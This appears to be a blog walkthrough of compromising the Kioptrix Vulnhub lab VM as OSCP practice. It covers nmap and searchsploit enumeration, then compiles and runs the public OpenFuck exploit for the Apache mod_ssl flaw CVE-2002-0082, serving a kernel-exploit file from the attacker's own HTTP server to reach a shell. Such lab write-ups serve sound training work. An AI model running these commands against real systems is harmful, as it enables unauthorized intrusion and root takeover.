---
published: true
---
Vulnhub virtual machine; On the path to OSCP this box offered Apache/OpenSSL vulnerability which led to a custom version of the exploit and an environmental problem and solution. 


----------

Legal Usage:
*The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risk/responsibilities.*


----------


# Initial setup:

This boot-2-root box is on the legacy side of things and there are a few things that need to be accomplished before you are able to boot this image (virtual box)


1. add Kioptix vmdk harddrive to storage as IDE (this box does NOT like SATA - will kernel panic)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363040523_image.png)



2. disable audio

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363076710_image.png)

3. change network adapter to PCnet-PCI II (AM79C970A) && Attached to Adapter

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363130573_image.png)



4. disable usb

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363207273_image.png)


With this configuration you should be able to properly boot the box.



----------

# Enumeration

Searching for target:

    netdiscover -r 192.168.56.0/24

*target looks to be 192.168.56.103*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363591282_image.png)


Perform NMAP scan:

    nmap -sC -sV -oA nmap/kio1 192.168.56.103

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550363637960_image.png)


*interesting to note that we have quite a few ports to examine.*

Since this is an older box lets search for any open vulnerabilites pertaining to the Apache and its mod_ssl 2.8.4 OpenSSL.

searchsploit

    searchsploit mod_ssl

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550364708694_image.png)


interesting candidate: *Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow* 

Based off the CVE: 2002-0082
There is a vulnerability pertaining to session cache code that fails to initialize memory using a special function that allows for a buffer overflow to execute arbitrary code. 

source: https://nvd.nist.gov/vuln/detail/CVE-2002-0082

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550365003778_image.png)


# Exploit
Copy the exploit locally:

    searchsploit -m exploits/unix/remote/764.c

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550365139174_image.png)


view source:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550365290795_image.png)


*search for any random shell code and/if replace if needed.*

compile source code:

    gcc -o exploit 764.c -lcrypto

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550365592122_image.png)


*looks to be missing some dependencies.*

correction: above exploit requires updating and can be correctly found at this repository. 

    git clone https://github.com/heltonWernik/OpenFuck.git

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550367827580_image.png)


download the ptrace-kmod.c && start python SimpleHTTPServer in directory of file.

edit the external link at line 671


![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550369200447_image.png)


install dependencies:

    apt-get install libssl-dev

compile:

    gcc -o OpenFuck OpenFuck.c -lcrypto

Run exploit:

    ./OpenFuck

*Search for which service you are attempting to exploit. Use the following syntax to continue.*

    ./OpenFuck 0x6b \[Target Ip\] [port] -c 40

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550368047575_image.png)


Running exploit against box:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550368200111_image.png)

    ./OpenFuck 0x6a 192.168.56.103 443 -c 50

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550369571756_image.png)


*hung awaiting the race condition of the exploit. Good to see the exploit be pulled from the SimpleHTTPServer.*

# Root - Plot Shift

change of plans: 
Reverted back to website which I know it wont be able to be reached. At that point I performed the steps manually to change the term and get a bash shell.


    TERM=xterm; export TERM=xterm; exec bash -i

![](https://d2mxuefqeaa7sj.cloudfront.net/s_CE01D670F53ABAFF66E89458B46E1D05E4D324802D4F23554DB6E2BAEB0EC034_1550370436781_image.png)


bring me the root!
